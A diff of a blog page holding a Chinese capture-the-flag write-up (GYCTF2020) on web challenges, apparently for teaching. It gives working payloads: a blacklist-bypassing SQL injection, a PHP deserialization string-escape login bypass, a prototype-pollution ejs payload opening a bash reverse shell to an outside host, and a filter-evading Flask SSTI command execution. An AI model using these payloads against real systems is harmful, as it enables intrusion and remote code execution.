@@ -1,178 +1,221 @@
 <!DOCTYPE html>
-<html lang="">
-
-
-
-
-
+<html lang>
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
-  <meta name="google-site-verification" content="fVesNdKs5rVgSDBf0Af0gVcCtxUVEriFBGLGBH2GH8s">
-  <link rel="apple-touch-icon" sizes="76x76" href="https://s2.ax1x.com/2019/10/30/K5JmBF.png">
-  <link rel="icon" type="image/png" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="description" content="Lethe&#39;s Blog">
-  <meta name="author" content="Lethe">
-  <meta name="keywords" content="Lethe&#39;s Blog">
-  <title>GYCTF2020_Writeup ~ Lethe&#39;s Blog</title>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.10.2/css/all.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.8.9/css/mdb.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+    <meta name="author" content="Lethe">
 
 
-  <link rel="stylesheet" href="/lib/prettify/tomorrow.min.css">
-
-<link rel="stylesheet" href="/css/main.css">
+    <meta name="subtitle" content="Life is a struggle">
 
 
-  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+    <meta name="description" content="Lethe's Blog">
+
+
+    <meta name="keywords" content="Lethe's Blog">
+
+
+<title>GYCTF2020_Writeup | Lethe&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
 
 
 </head>
-
-
+<!-- <body background="https://s1.ax1x.com/2020/11/02/Br52e1.jpg"
+      style="background-repeat:no-repeat;
+			 background-size:100% 100%;
+             background-attachment: fixed;"> -->
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe's Blog</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/">Home</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">Archives</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/categories/">Categories</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">Tags</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">About</a>
-          </li>
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="view intro-2" id="background"
-         style="background: url('https://s2.ax1x.com/2020/03/11/8k84bQ.jpg')no-repeat center center;
-           background-size: cover;
-           background-attachment: fixed;">
-      <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <br>
-              
-                <p class="mt-3">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  Friday, March 6th 2020, 5:21 pm
-                </p>
-              
-
-              <p>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="menu navbar-right">
                 
-                  
-                  &nbsp;<i class="far fa-chart-bar"></i>
-                  <span class="post-count">
-                    6.2k 字
-                  </span>&nbsp;
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-
+                    <a class="menu-item" href="/category">Categories</a>
                 
-                  
-                  &nbsp;<i class="far fa-clock"></i>
-                  <span class="post-count">
-                      27 分钟
-                  </span>&nbsp;
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-
+                    <a class="menu-item" href="/about">About</a>
                 
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
-                  <span id="busuanzi_container_page_pv">
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>&nbsp;
-                
-              </p>
-            
-          </div>
-
-          
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
         </div>
-      </div>
-    </div>
-  </header>
+    </nav>
 
-  <main>
     
-      
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <b><a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a></b>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <b><a class="menu-item" href="/archives">Posts</a></b>
+                
+                    <b><a class="menu-item" href="/category">Categories</a></b>
+                
+                    <b><a class="menu-item" href="/tag">Tags</a></b>
+                
+                    <b><a class="menu-item" href="/about">About</a></b>
+                
+            </div>
+        </div>
+    </nav>
 
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto" id="post">
-          <div class="markdown-body">
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <!-- <body style="background-color:rgb(199,237,204);"> -->
+<body style="background-color: RGB(227, 237, 205);">
+<div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">GYCTF2020_Writeup</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 6, 2020&nbsp;&nbsp;17:21:45</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Writeup/">Writeup</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
             <h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>一到注入题，和2019强网杯的随便住基本一致，但是多过滤了<code>set</code>、<code>prepare</code>、<code>alter</code>、<code>rename</code>：</p>
 <pre><code>return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);
 </code></pre><p>获取表名和列名的方式与原题一致，而获取数据可以参考这篇文章：<a href="https://xz.aliyun.com/t/7169#toc-47，使用handler语句进行查询。" target="_blank" rel="noopener">https://xz.aliyun.com/t/7169#toc-47，使用handler语句进行查询。</a></p>
 <blockquote>
-<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200224112929391.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>所以可以构造payload如下：</p>
+<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200224112929391.png" alt="在这里插入图片描述"><br>所以可以构造payload如下：</p>
 <pre><code>?inject=-1&#39;;handler FlagHere open;handler FlagHere read first%23
-</code></pre><p><img src="/2020/03/06/GYCTF2020-Writeup/20200224115021507.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+</code></pre><p><img src="/2020/03/06/GYCTF2020-Writeup/20200224115021507.png" alt="在这里插入图片描述"></p>
 </blockquote>
 <p><br></p>
 <h1 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h1><p>看名字就是一道sql注入的题目，经测试总共有四种回显：</p>
@@ -313,9 +356,9 @@ class dbCtrl
 </code></pre><p>然后再将<code>$this-&gt;password</code>的值赋为1（1的md5值为c4ca4238a0b923820dcc509a6f75849b），即可通过登录密码的验证。</p>
 <p>下面的问题就是如何控制执行的sql语句以及<code>$this-&gt;password</code>的值，这就需要用到反序列化了，我们看一下如何构造POP链：</p>
 <ul>
-<li>在<code>UpdateHelper::__destruct()</code>中看到字符串输出语句，所以只需要将<code>$sql</code>实例化为<code>User</code>类的对象，即可在该类对象结束时，调用到 <code>User::__toString</code>方法<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225122020890.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
-<li>然后看<code>User::__toString</code>方法，用<code>$nickname</code>变量调用了<code>update()</code>函数，且<code>$age</code>变量作为参数。这样我们只需要将<code>$nicknames</code>实例化为<code>Info</code>类的对象，从而可以调用<code>Info::__call</code>方法，且<code>$age</code>中的值会作为参数传入。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225122808374.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
-<li>之后我们继续跟进到<code>Info::__call</code>方法，可以看到其用<code>$CtrCase</code>变量调用了<code>login()</code>方法，且参数就是上一步通过<code>User.age</code>的值传进来的。这样我们只需要将这个类里的<code>$CtrlCase</code>变量实例化为<code>dbCtrl</code>类的对象，这句话就相当于调用了<code>dbCtrl::login($sql)</code>，而且参数sql语句也是我们所控制的了，也就达到了我们的目的。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225123203656.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
+<li>在<code>UpdateHelper::__destruct()</code>中看到字符串输出语句，所以只需要将<code>$sql</code>实例化为<code>User</code>类的对象，即可在该类对象结束时，调用到 <code>User::__toString</code>方法<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225122020890.png" alt="在这里插入图片描述"></li>
+<li>然后看<code>User::__toString</code>方法，用<code>$nickname</code>变量调用了<code>update()</code>函数，且<code>$age</code>变量作为参数。这样我们只需要将<code>$nicknames</code>实例化为<code>Info</code>类的对象，从而可以调用<code>Info::__call</code>方法，且<code>$age</code>中的值会作为参数传入。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225122808374.png" alt="在这里插入图片描述"></li>
+<li>之后我们继续跟进到<code>Info::__call</code>方法，可以看到其用<code>$CtrCase</code>变量调用了<code>login()</code>方法，且参数就是上一步通过<code>User.age</code>的值传进来的。这样我们只需要将这个类里的<code>$CtrlCase</code>变量实例化为<code>dbCtrl</code>类的对象，这句话就相当于调用了<code>dbCtrl::login($sql)</code>，而且参数sql语句也是我们所控制的了，也就达到了我们的目的。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225123203656.png" alt="在这里插入图片描述"></li>
 <li>最后我们只需要对<code>dbCtrl</code>类里的一些变量赋值成我们需要的值即可，而且可知<code>dbCtrl::login($sql)</code>中的<code>$sql</code>参数，实际上是<code>User</code>类中<code>$age</code>变量传入的。</li>
 </ul>
 <p>所以最终的反序列化payload脚本如下：</p>
@@ -391,18 +434,18 @@ echo serialize($o);
 <p>假设我们要通过nickname参数来注入，先看一下我们构造的payload2如下（未逃逸字符串前）：</p>
 <pre><code class="python">&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:{s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}}}}}
 </code></pre>
-<p>可以看到我们在而已序列化串前加上了<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>，在最后加上了一个<code>}</code>（整个长度为263），这样我们将其作为<code>new Info($age,$nickname)</code>的nickname传入时，序列化的结果如下：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225135058986.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>上图中两个箭头之间的内容就是我们传入的payload，可以看到我们在第一个箭头那里是想闭合双引号，从而使后面的内容符合序列化的规则的。但是我圈出来的那个263在序列化的规则里，限制了nickname的长度为263，所以后面长度为263的payload还是当作了一个普通字符串，而不是序列化里的内容。</p>
-<p>这时候就需要用到字符逃逸的原理了，我们在payload2的前面加上263个<code>union</code>，这样我上面圈出来的值就变成了$263×5+263=1578$，上面第一个箭头所指的双引号里是263个<code>union</code>(长度为$263×5=1315$)，当对这个序列化串进行<code>safe()</code>函数的处理时，所有的<code>union</code>都被替换成了<code>hacker</code>，也就是双引号里的内容变成了263个<code>hacker</code>（长度为$263×6=1578$），正好等于前面的1579，如下：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225140946410.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>可以看到我们在而已序列化串前加上了<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>，在最后加上了一个<code>}</code>（整个长度为263），这样我们将其作为<code>new Info($age,$nickname)</code>的nickname传入时，序列化的结果如下：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225135058986.png" alt="在这里插入图片描述"><br>上图中两个箭头之间的内容就是我们传入的payload，可以看到我们在第一个箭头那里是想闭合双引号，从而使后面的内容符合序列化的规则的。但是我圈出来的那个263在序列化的规则里，限制了nickname的长度为263，所以后面长度为263的payload还是当作了一个普通字符串，而不是序列化里的内容。</p>
+<p>这时候就需要用到字符逃逸的原理了，我们在payload2的前面加上263个<code>union</code>，这样我上面圈出来的值就变成了$263×5+263=1578$，上面第一个箭头所指的双引号里是263个<code>union</code>(长度为$263×5=1315$)，当对这个序列化串进行<code>safe()</code>函数的处理时，所有的<code>union</code>都被替换成了<code>hacker</code>，也就是双引号里的内容变成了263个<code>hacker</code>（长度为$263×6=1578$），正好等于前面的1579，如下：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225140946410.png" alt="在这里插入图片描述"></p>
 <p>上面的图可以看出来经过safe()函数处理后，这个序列化串就被解释成了nickname变量长度为1586的重复<code>hacker</code>字符串，而我们的而已序列化payload，则以对象的形式作为CtrCase变量的值。<br>而之所前面构造的时候在最后面加一个<code>}</code>，是因为<code>Info</code>类的对象只有3个变量（第一个箭头所指），当到我们第二个箭头所指的位置时，前面已经有3个变量满足了序列化串的要求了，所以加一个<code>}</code>来闭合整个序列化串。这样由于前面的内容已经符合反序列化的规则，所以后面的内容都将被忽略。</p>
 <p>最终payload如下：</p>
 <pre><code class="python">age=1&amp;nickname=unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:{s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:{s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}}}}}
 </code></pre>
-<p>在update.php以POST传入上面的payload，此时反序列化被执行，在login函数里面已经成功验证了，token被设置为了<code>admin</code>，所以再回到登录界面使用任意密码即可登录admin账户：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225013210183.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
+<p>在update.php以POST传入上面的payload，此时反序列化被执行，在login函数里面已经成功验证了，token被设置为了<code>admin</code>，所以再回到登录界面使用任意密码即可登录admin账户：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200225013210183.png" alt="在这里插入图片描述"><br><br></p>
 <h1 id="Ez-Expresss"><a href="#Ez-Expresss" class="headerlink" title="Ez_Expresss"></a>Ez_Expresss</h1><p>存在<a href="http://www.zip源码泄露，可以下载得到源码。" target="_blank" rel="noopener">www.zip源码泄露，可以下载得到源码。</a></p>
-<p>在登录界面，有如下提示：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305234711800.png" srcset="/img/loading.gif" alt><br>这里只支持大写非常的奇怪，查阅资料得到：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305234811798.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>再查看源码，确实是使用了toUpperCase()进行处理，所以可以利用这个特性来注册<code>admın</code>用户进行绕过：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306000532187.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<p>可以看到成功了，并且提示flag在/flag目录下。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306000712785.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>在登录界面，有如下提示：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305234711800.png" alt><br>这里只支持大写非常的奇怪，查阅资料得到：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305234811798.png" alt="在这里插入图片描述"><br>再查看源码，确实是使用了toUpperCase()进行处理，所以可以利用这个特性来注册<code>admın</code>用户进行绕过：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306000532187.png" alt="在这里插入图片描述"></p>
+<p>可以看到成功了，并且提示flag在/flag目录下。<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306000712785.png" alt="在这里插入图片描述"></p>
 <p>下面就考虑如何读文件或者RCE，再次进行代码审计。</p>
-<p>一开始就是熟悉的merge+clone，那么考虑是否存在原型链污染（不熟悉的话可参考p神的：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">深入理解 JavaScript Prototype 污染攻击</a>）<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305235757818.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>在<code>/action</code>路由下使用了<code>clone()</code>方法：</p>
+<p>一开始就是熟悉的merge+clone，那么考虑是否存在原型链污染（不熟悉的话可参考p神的：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">深入理解 JavaScript Prototype 污染攻击</a>）<br><img src="/2020/03/06/GYCTF2020-Writeup/20200305235757818.png" alt="在这里插入图片描述"><br>在<code>/action</code>路由下使用了<code>clone()</code>方法：</p>
 <pre><code class="javascript">router.post(&#39;/action&#39;, function (req, res) {
   if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)} 
   req.session.user.data = clone(req.body);
@@ -410,39 +453,39 @@ echo serialize($o);
 });
 </code></pre>
 <p>这个路由只有ADMIN可以访问，且<code>clone()</code>的参数是我们可控的，所以可以确定原型链污染了。</p>
-<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306001937535.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后在info路由看到了一个莫名其妙又有点眼熟的<code>outputFunctionName</code>，在XNUCA 2019的HardJS考过这个，拼接在ejs渲染引擎中可以RCE，可参考我当时<a href="https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019%E9%83%A8%E5%88%86web%E9%A2%98%E5%A4%8D%E7%8E%B0/#xnuca-2019-hardjs-1">对HardJS的分析文章。</a></p>
+<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306001937535.png" alt="在这里插入图片描述"><br>然后在info路由看到了一个莫名其妙又有点眼熟的<code>outputFunctionName</code>，在XNUCA 2019的HardJS考过这个，拼接在ejs渲染引擎中可以RCE，可参考我当时<a href="https://lethe.site/2019/09/11/ByteCTF-2019-XNUCA-2019%E9%83%A8%E5%88%86web%E9%A2%98%E5%A4%8D%E7%8E%B0/#xnuca-2019-hardjs-1">对HardJS的分析文章。</a></p>
 <p>所以可以直接改一下当时的payload就好：</p>
 <pre><code class="json">{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;a=1;process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xxx/7777 0&gt;&amp;1\&quot;&#39;)//&quot;}}
 </code></pre>
 <p>参考<a href="https://xz.aliyun.com/t/7184#toc-7推荐一个更好一点的命令执行的payload，因为有时候用require会报错：" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184#toc-7推荐一个更好一点的命令执行的payload，因为有时候用require会报错：</a></p>
 <pre><code class="json">{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;a=1;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xxx/7777 0&gt;&amp;1\&quot;&#39;)//&quot;}}
 </code></pre>
-<p>然后提交<code>/action</code>（即最喜欢的语言）并抓包，然后填入poayload，注意要把Content-Type: 改为plication/json：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306004459451.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后访问<code>/info</code>路由让<code>outputFunctionName</code>拼接到渲染引擎中触发原型链污染，即可得到shell：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306004728516.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>然后提交<code>/action</code>（即最喜欢的语言）并抓包，然后填入poayload，注意要把Content-Type: 改为plication/json：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306004459451.png" alt="在这里插入图片描述"><br>然后访问<code>/info</code>路由让<code>outputFunctionName</code>拼接到渲染引擎中触发原型链污染，即可得到shell：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306004728516.png" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1 id="FlaskApp"><a href="#FlaskApp" class="headerlink" title="FlaskApp"></a>FlaskApp</h1><p>进入页面后，是一个Flask写的base64加解密功能，提示路由的源码中提示了<code>PIN</code>，应该是想说Flask的Debug模式中的PIN码。</p>
-<p>在Base64解码的功能中很容易使其报错（如输入1）：<img src="/2020/03/06/GYCTF2020-Writeup/20200306170505781.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>可以看到确实开启了Debug模式，并泄露了decode路由的源码:<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306170602388.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>解码的结果直接拼接到模板中渲染，存在SSTI漏洞，不过经过了<code>waf</code>的处理，我们也并不知道过滤了什么东西。</p>
-<p>那么先试试一下SSTI吧：<br><code>4</code>的base64为<code>e3syKzJ9fQ==</code>，我们进行解码得到4，确认存在SSTI了：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306170927846.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>在Base64解码的功能中很容易使其报错（如输入1）：<img src="/2020/03/06/GYCTF2020-Writeup/20200306170505781.png" alt="在这里插入图片描述"><br>可以看到确实开启了Debug模式，并泄露了decode路由的源码:<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306170602388.png" alt="在这里插入图片描述"><br>解码的结果直接拼接到模板中渲染，存在SSTI漏洞，不过经过了<code>waf</code>的处理，我们也并不知道过滤了什么东西。</p>
+<p>那么先试试一下SSTI吧：<br><code>4</code>的base64为<code>e3syKzJ9fQ==</code>，我们进行解码得到4，确认存在SSTI了：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306170927846.png" alt="在这里插入图片描述"></p>
 <h4 id="非预期解：利用SSTI进行RCE"><a href="#非预期解：利用SSTI进行RCE" class="headerlink" title="非预期解：利用SSTI进行RCE"></a>非预期解：利用SSTI进行RCE</h4><p>虽然知道出题人的意思是利用PIN码来RCE，不过我还是想试试看能否直接利用SSTI进行RCE。</p>
 <p>那么先试试过滤了哪些？</p>
-<p>经过测试，SSTI中常用的一些关键词并没有被过滤(毕竟预期解也需要SSTI来读文件~)：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306171543736.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>而是过滤了<code>system</code>、<code>popen</code>、<code>os</code>、<code>eval</code>、<code>import</code>、<code>flag</code>等RCE需要用到的关键词，但是这个过滤可以使用<strong>拼接字符串</strong>来绕过，这样我们想构造一个payload绕过就并不是很难了：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306172027467.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>经过测试，SSTI中常用的一些关键词并没有被过滤(毕竟预期解也需要SSTI来读文件~)：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306171543736.png" alt="在这里插入图片描述"><br>而是过滤了<code>system</code>、<code>popen</code>、<code>os</code>、<code>eval</code>、<code>import</code>、<code>flag</code>等RCE需要用到的关键词，但是这个过滤可以使用<strong>拼接字符串</strong>来绕过，这样我们想构造一个payload绕过就并不是很难了：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200306172027467.png" alt="在这里插入图片描述"></p>
 <p>所以我们要构造的payload一定不是能是<code>xx.popen()</code>的形式，而是要把被过滤的关键词用字符串的方式调用，这样才能利用拼接或者编码来绕过，实际上这样的payload也很常见，网上能搜到很多。并且本题环境中可以用的类也不少，如下面两个payload均可以RCE：</p>
 <pre><code class="python">{{''.__class__.__base__.__subclasses__()[131].__init__.__globals__['__builtins__']['ev'+'al']('__im'+'port__("o'+'s").po'+'pen("cat /this_is_the_fl'+'ag.txt")').read()}}
 </code></pre>
